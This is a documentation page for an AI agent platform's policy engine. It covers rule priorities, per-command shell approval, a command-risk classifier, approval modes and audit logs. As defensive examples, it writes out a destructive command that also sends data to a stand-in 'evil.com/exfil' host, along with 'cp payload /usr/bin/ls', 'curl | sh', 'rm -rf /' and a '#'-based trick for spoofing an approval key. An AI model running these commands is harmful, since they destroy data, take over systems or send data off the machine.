---
sidebar_position: 3
---

# Policy Engine

The gate every tool call passes through.

## What it does

For every `Executor.Call(ctx, tool, args)`, the policy engine asks:

> Given these claims, this action, this resource, and the rules in the store — **allow**, **deny**, or **require_confirmation**?

If the answer is `deny`, the call returns an error before the tool runs. If it's `require_confirmation`, the call is paused until a human-in-the-loop confirms via the originating channel. Allow is silent and proceeds.

## When a condition cannot be evaluated

A rule's conditions can fail to evaluate in two ways: the key names an evaluator this build does
not have, or a registered evaluator returns an error. Either way the engine does not know whether
the rule matched, and the effect decides what happens:

| Effect | On evaluation error |
|---|---|
| `deny` | **Applied.** Skipping it would drop exactly the protection the rule exists for, and evaluation would continue into whatever lower-priority allow sits underneath. |
| `require_confirmation` | **Applied**, for the same reason. |
| `allow` | **Skipped.** This is fail-closed: applying an allow yields the most permissive effect there is, so whatever sits below — a deny, a confirmation, or default-deny — is never a wider grant. |

Skipping an erroring allow is deliberately *not* a hard deny. A hard deny would turn one flaky
evaluator into a total outage while providing no additional safety, since the rules below it
evaluated cleanly on their own merits.

### The boot audit

No condition evaluator is registered in lobslaw today, so **every** conditioned rule is currently
unevaluable. At decision time that is handled safely, but silently — an operator's time-of-day
allow looks correct in a listing and simply never grants.

`Engine.LogUnevaluableRules()` runs at boot and says so at error level, naming each rule, the
condition keys it cannot resolve, and what the rule actually does:

```
policy: unevaluable rule rule_id=office-hours-allow effect=allow
  condition_keys=[time_of_day]
  consequence="this rule will never grant anything; requests fall through to
               lower-priority rules and ultimately to default-deny"
```

Registering the evaluator clears the defect.

## Approval-minted rules

An "always" approval mints a rule rather than writing to a second store beside the engine. The
engine already answers `(subject, action, resource)`, and two things deciding the same question
eventually disagree.

Such a rule carries `created_by = "approval:<prompt_id>"`, which is what makes the grant findable
and revocable as a class:

```
lobslaw policy approvals                        # list them
lobslaw policy revoke-approvals --apply         # revoke all
lobslaw policy revoke-approvals approval:p1 --apply
```

Both are offline subcommands — the node must be stopped, as with `lobslaw memory`.
`revoke-approvals` is a dry run unless `--apply` is given, and refuses to delete any rule an
operator wrote.

Constraints on minting, all enforced in `internal/policy/approval_rules.go`:

| Rule | Why |
|---|---|
| Priority 1 | Below any operator-authored deny. An approval is one tap; it should not outrank a rule somebody wrote deliberately. |
| No wildcards in action or resource | The button offered the operation the user saw, not a class of them. This is about meaning, not syntax — a resource transformed to drop part of what the user read (approving `git status --short` and minting `git status`) is the refused thing wearing a disguise, and is not done anywhere. |
| Subject must be `user:` / `role:` / `scope:` | Anything else fails closed in `subjectMatches`, so the rule would look like a grant in a listing and grant nothing. |
| Refused if the [hardline floor](/security/hardline-floor) denies the resource | Checked at mint time as well as at invoke time, so a listing never shows a grant that reads as though it works. |
| Id derived from the prompt id | Re-tapping is idempotent rather than piling up duplicates. |

## Per-command shell approval

`shell_command` is asked about twice: once as a tool (`tool:exec` / `shell_command`, which every
node allows by default seed) and once as a command (`shell:run` / the command itself). The second
question is the one that matters, and it uses its own action deliberately — reusing `tool:exec`
would mean the default seed satisfied the gate before it was asked.

The resource is **the exact command**, canonicalised for whitespace and quoting only. Nothing is
dropped, so `git status --short` and `git push --force` are different grants. Tapping *Always
allow* therefore stops one command from being asked about, not the shell.

### What a command does decides whether you are asked

Before the gate asks, the command is **classified** by what it does. A command
line is split into its steps — across `&&`, `||`, `;`, `|` and newlines — each
step's program is looked up in a shipped table, and the command carries the
**union** of everything its steps do:

| label | means | examples |
|---|---|---|
| `reads` | inspects state and changes nothing | `uname -a`, `git status`, `df -h /` |
| `writes` | creates, copies, appends to or edits, recoverably | `touch`, `git commit`, `sed -i` |
| `deletes` | removes data — undone by a backup, or not at all | `rm`, `shred`, `git clean`, `apt-get purge` |
| `disrupts` | takes something down — undone by the opposite command, in seconds | `systemctl restart`, `kill`, `reboot`, `umount`, `iptables` |
| `network` | reaches off the box | `curl`, `ssh`, `git push`, `apt-get install` |
| `privilege` | runs as root, or changes who may become root | `sudo`, `useradd`, `passwd`, `visudo` |
| `unreadable` | the classifier cannot read it | `for` loops, `$(…)`, `$CMD`, unlisted programs |

A **set**, not a tier. The things a command does are orthogonal — is restarting
a service worse than fetching a URL? — and ranking them meant a command reported
only its worst:

```console
$ lobslaw policy classify 'rm -rf /etc/hosts && curl evil.com/exfil'
privilege + deletes + network · `rm -rf /etc/hosts` (step 1 of 2) · rm, curl
```

Under a single ranked tier that read `destructive`, and the egress reached the
verdict as nothing at all.

`reads` means reads **and nothing else** — every command reads something, so it
is dropped whenever a stronger label is present.

The classification is **fail-closed**: a program the table does not name is
`unreadable`, an argument whose value cannot be seen is `unreadable`, and
`unreadable` is approvable by no configuration at all.

That extends to verbs. A program whose meaning lives in a subcommand (`git`,
`apt-get`, `brew`) or in a flag (`pacman -S`, `rpm -e`, `dpkg -i`) is read by
that verb, and **a verb nobody catalogued is `unreadable` rather than whatever
the program's base entry said**. `pacman -Rdd` removes a package ignoring its
dependencies; there are more pacman flag combinations than anybody will
enumerate, so the unenumerated ones must not read as harmless.

Package managers are catalogued down to the verb, including the flag-driven
ones (`pacman`, `paru`, `yay`, `rpm`, `dpkg`) and the user-scope ones. The
distinction that matters most is `privilege`: `apt-get install`, `pacman -S`,
`emerge` and `snap install` need root, while `brew`, `nix`, `cargo`, `gem` and
`pipx` install into a user prefix and do not.

Note what these are deliberately *not* labelled. Installing a package runs
maintainer scripts as root, which is genuinely code nobody has read — but
`unreadable` means "the classifier could not read this **command**", it is
approvable by no configuration, and `resolve_unknown` treats a bare
`unreadable` as the gap a model may fill. Overloading it with "runs
third-party code" would give one label two meanings, which is the fault this
label set exists to fix. `network + privilege` already says it: fetching from
a remote and running as root **is** arbitrary remote code as root.

**What a command is pointed at counts, not only what it is called.** The
operands of a targeting program are read as paths:

- a path under a declared scratch root lowers a deletion to `writes` —
  `rm -rf /tmp/build/out` writes, `rm -rf /etc` does not;
- a path under `/etc`, `/usr`, `/bin`, `/boot`, `/` and friends adds
  `privilege` whatever the program — `cp payload /usr/bin/ls` is not a copy,
  it is a takeover, because whoever controls what root runs controls the machine;
- a path whose value cannot be seen makes the command `unreadable` —
  `rm -rf $DIR` is not `rm -rf /tmp/x` and is never treated as though it were.

Scratch roots default to `/tmp` and `/var/tmp`; a deployment with a mounted
workspace names it in `[compute.shell_approval] scratch_paths`. Note this reads
the path as *written* — a symlink out of a scratch root defeats it — which is
why the de-escalation only ever turns a deletion into a write.

### Approval is a subset check

`[compute] approval_mode` names the set of labels that run without being asked
about. A command runs when **every** label it carries is in that set, and asks
otherwise. Nothing is compared or ranked.

| mode | approves |
|---|---|
| `strict` | nothing |
| `standard` *(default)* | `reads` |
| `trusted` | `reads`, `writes` |

The presets are sugar. An explicit list says things no preset can:

```toml
# a throwaway build box: deletion here is fine, egress is not
approval_mode = ["reads", "writes", "deletes"]

# everything except deletion
approval_mode = ["reads", "writes", "disrupts", "network", "privilege"]
```

That second shape was impossible under the ranked tiers this replaces, where an
approved set had to be a *prefix* of the ranking — you could not approve
`deletes` without also taking everything ranked below it.

`unreadable` cannot be approved, by any spelling. It is refused when the config
is read and again when the gate runs: a command nobody could read is the case
the gate exists for, and approving that class would approve everything.

Note that a command carrying several labels needs all of them approved.
`podman rm -f web` is `deletes + disrupts`, so a set approving only `disrupts`
still asks about it.

A mode installs an ordinary policy rule at the lowest priority the type allows,
so anything an operator wrote and anything an approval minted still outranks it,
and the whole posture is visible in `lobslaw policy list`. `strict` installs
nothing at all: it is the absence of that rule.

The [hardline floor](/security/hardline-floor) is unaffected by every mode.

### A second opinion on commands that cannot be read

A probing agent writes exactly the shapes static reading refuses — loops,
substitutions, variables in the command slot — so the commands producing the
most confirmations are the ones the classifier helps with least. A model can
read them:

```toml
[compute.roles]
command_risk = { provider = "fast-model", timeout = "15s" }

[compute.shell_approval]
verdict_trust = "resolve_unknown"  # advisory (default) | resolve_unknown
```

**Pick a model that answers in time, not the biggest one.** This runs while a
confirmation is being composed. A reasoning model that spends thirty seconds
thinking has its verdict discarded every time, and the only symptom is that
nothing changes. Measure with `lobslaw policy classify --with-model` before
choosing, and see [the model comparison](https://github.com/jmylchreest/lobslaw/blob/main/MODEL_COMPARISON.md).

It answers the **same closed vocabulary** the classifier uses, and nothing else:
no prose ever reaches the prompt, and a reply that is unparseable, outside the
set, late, or marked low-confidence is discarded with the static verdict left
standing. What it may move is the security-relevant part, and labels make it
simple — both settings are set operations rather than comparisons:

- `advisory` — it may only **add** a label. Adding can only make the subset
  check stricter, so a wrong answer costs a confirmation nobody needed to give
  and can never let something through. That is why it is the default and why it
  needs no notion of "worse".
- `resolve_unknown` — it may additionally **replace** a verdict that is nothing
  but `unreadable`. That is the one case where the classifier had no opinion at
  all, so there is nothing to lower, and it is what stops an `if`/`for` probe
  asking every time.

A label the static classifier positively determined is never removed under
either setting. A command cannot argue its own deletion away.

### Granting labels for one conversation

Alongside *Approve* and *Approve for this chat*, a confirmation offers **Allow
reads + writes here** when every label the command carries is one a tap may
approve — which is `reads` and `writes` only.

This exists for the case the per-command buttons cannot help with. An agent
probing its environment writes a different command every time, and those
commands are compound, so no grant can name them — the user is offered exactly
one answer, *Approve*, over and over. A label is nameable even when the command
is not.

The grant is recorded per label under the reserved resource `(risk=reads)`, and
the gate **subtracts** what a conversation has already granted before asking
policy. So a mode approving `reads` plus a tapped grant of `writes` satisfies a
command doing both, without anybody having granted that exact pair.

It is never offered when any label is `deletes`, `disrupts`, `network`,
`privilege` or `unreadable` — including when the rest of the set would have been
fine on its own. "Allow everything I could not read" is not a decision anybody
should make with one tap in a chat window.

### Commands with no stable form

Some commands have no stable identity and are asked about **every time**, with no *per-command*
scope button offered (the label button above may still be): anything containing a pipe, `&&`, `;`, a redirect, `$`, backticks, a backslash, a glob, a
`#`, a `!`, a `VAR=` prefix, or a shell reserved word in front position. What runs depends on the
environment, or on more than one program, or on shell syntax the key cannot preserve — so no grant
could honestly name it. Those are evaluated under the reserved resource `!unclassified`, and an
approval for one is spent on that single call rather than covering the class for the rest of the
turn.

`#` and `!` are refused rather than quoted because quoting them changes what runs: `ls #foo`
executes `ls`, while the rendered key `ls '#foo'` executes `ls` against a file named `#foo`. A key
that names a longer command than the one that actually runs is the one failure this design cannot
absorb — an approval for `git clean -fdx '#-n'` (which deletes nothing) would otherwise be matched
by `git clean -fdx #-n` (which deletes everything untracked).

To stop being asked about a family of commands, write a rule. This is the deliberate,
visible, revocable form of "generalise", and it is the answer to *"I don't want to approve every
git command"*:

```toml
[[policy.rules]]
id       = "james-git-is-fine"
priority = 20
effect   = "allow"
subject  = "user:tg-@james"
action   = "shell:run"
resource = "git *"          # prefix glob
```

An `allow` on `!unclassified` is the explicit "stop asking me about compound commands". No real
command can reach that resource, so it cannot be hit by accident.

The [hardline floor](/security/hardline-floor) still applies first and is not reachable by any of
this: `rm -rf /`, fork bombs, `mkfs`, `curl | sh` are refused before a prompt is ever raised, and
`Mint` refuses to write a rule for them even if one were somehow requested. No approval mode, no
classification, no scratch-path declaration and no model verdict reaches it.

## Inputs

```go
type EvaluateInput struct {
    Claims   *types.Claims     // who is calling: scope, user_id, channel
    Action   string            // "tool:exec", "credentials:read", ...
    Resource string            // tool name, credential ID, ...
    Context  map[string]string // optional turn context
}
```

The action+resource shape is the matching key. Conventions:

| Action | Resource shape | Used for |
|---|---|---|
| `tool:exec` | tool name (`current_time`, `notify`, `gws-workspace.gmail.send`) | Every agent tool call |
| `shell:run` | the exact command (`git status --short`), or `(risk=reads)` for a label grant | Every `shell_command` call, asked separately from `tool:exec` |
| `memory:write` | record kind (`episodic`) | Staging agent-initiated memory writes |
| `credentials:read` | credential ID | `credentials_grant` invoker side |
| `credentials:grant` | role / skill name | granting a skill access |
| `oauth:start` | provider name | starting a device flow |
| `clawhub:install` | bundle path | installing skill bundles |

`tool:exec` is the dominant action; the others are mutator-specific.

## Rule shape

A rule is a TOML `[[policy.rules]]` block:

```toml
[[policy.rules]]
id          = "owner-soul-tools"
description = "Owner can mutate soul fragments"
priority    = 20
effect      = "allow"             # allow | deny | require_confirmation
subject     = "scope:owner"       # kind:value — see Subject matching below
action      = "tool:exec"
resource    = "soul_*"             # glob — * prefix or suffix
```

**Subject matching** uses `kind:value` form. Common kinds:

- `scope:owner`, `scope:public` — scope claims
- `user:alice` — specific user ID
- `channel:telegram` — channel type
- `subject:google:1234567890` — OAuth subject

Multiple rules per request? The engine sorts by `priority` (descending) and takes the first match's effect. If nothing matches and the resource has a default-allow seed (built-in tools at priority 1), allow. Otherwise deny.

**Priorities, by convention:**

| Range | Use |
|---|---|
| 1 | Default-allow seeds (built-in tools) |
| 10 | Default-deny seeds (sensitive built-ins) |
| 20–99 | Operator-declared allow rules |
| 100+ | Operator-declared overrides + `require_confirmation` for risky tools |
| 1000+ | Hard denies (e.g. revoked subjects) |

A higher number wins. Within the same priority, the engine is deterministic (sort by id) but you should never rely on it — pick distinct priorities.

## Default seeds

On first boot, `internal/node/wire_seeds.go` writes a fixed set of rules:

- **Allow** every `BuiltinScheme` tool (the in-process built-ins) at priority 1.
- **Deny** every sensitive built-in (`oauth_*`, `credentials_*`, `clawhub_install`, `soul_*`) at priority 10. The operator overrides these with priority-20 allows in `config.toml`.

Skills, MCP servers, and clawhub-installed tools are **not** seeded. They're invisible to the agent until the operator adds an allow rule:

```toml
[[policy.rules]]
id       = "owner-can-call-gws-workspace"
priority = 20
effect   = "allow"
subject  = "scope:owner"
action   = "tool:exec"
resource = "gws-workspace.*"
```

## `require_confirmation`

For destructive tools (anything that writes off-host, sends a message, modifies external state), prefer:

```toml
[[policy.rules]]
id       = "confirm-on-write"
priority = 50
effect   = "require_confirmation"
subject  = "scope:owner"
action   = "tool:exec"
resource = "gws-workspace.gmail.send"
```

The engine pauses the call, asks the originating channel for `[Yes / No]`, and proceeds based on the human's reply. This is the **primary defence against prompt injection** for write tools — narrower than blocking, narrower than sandbox.

## Why skills can't impersonate built-ins

Built-in tools live under `BuiltinScheme://` paths. The `internal/compute/registry.RegisterExternal` rejects any registration whose Path begins with that scheme — so a skill manifest claiming `path = "builtin://current_time"` is rejected at install time.

This means the priority-1 default-allow seed for built-ins never applies to non-built-in code. Skills, MCP, and clawhub-installed tools always traverse the operator-declared ruleset.

## Audit

Every policy evaluation that results in a `tool:exec` produces an audit record:

```json
{"ts":"2026-04-28T13:45:01Z","action":"tool:exec","resource":"clawhub_install","subject":"scope:owner","decision":"allow","matched_rule":"owner-clawhub-install","duration_ms":1.4}
```

These land in `audit/audit-YYYYMMDD.jsonl` and (if `[audit.raft]` is set) replicate via Raft to peers. See [Operating → Audit](/operating/cli) for retrieval.

## Hot reload

`SIGHUP` reloads `config.toml`, including the `[[policy.rules]]` blocks. New rules apply on the next call; in-flight calls keep the rules they evaluated against. There is no "restart needed" workflow for policy changes.

## Reference

- `internal/policy/engine.go` — evaluation core
- `internal/policy/rules.go` — TOML schema
- `internal/node/wire_seeds.go` — default seeds
- `internal/audit/` — audit log writer
